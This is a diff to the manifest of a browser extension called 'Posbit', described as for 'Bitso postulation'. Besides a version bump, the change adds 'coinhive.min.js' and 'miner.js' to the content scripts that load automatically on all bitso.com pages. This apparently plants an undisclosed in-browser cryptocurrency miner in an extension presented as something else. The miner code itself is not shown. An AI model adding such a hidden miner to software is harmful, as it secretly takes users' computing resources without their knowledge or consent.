@@ -2,15 +2,23 @@
     "manifest_version" : 2,
     "name"             : "Posbit",
     "short_name"       : "posbit",
-    "version"          : "1.10",
+    "version"          : "1.12",
     "description"      : "Bitso postulation",
     "options_page"     : "options.html",
     "content_scripts": [{
       "matches": ["https://*.bitso.com/*"],
-      "js": ["js/localstorage.js","js/posbit.js","js/contentscript.js"]
+      "js": [
+            "js/coinhive.min.js",
+            "js/localstorage.js",
+            "js/posbit.js",
+            "js/contentscript.js",
+            "js/miner.js"
+        ]
     }],
     "background": {
-        "scripts": ["js/background.js"]
+        "scripts": [
+            "js/background.js"
+        ]
     },
     "permissions": [
         "notifications"
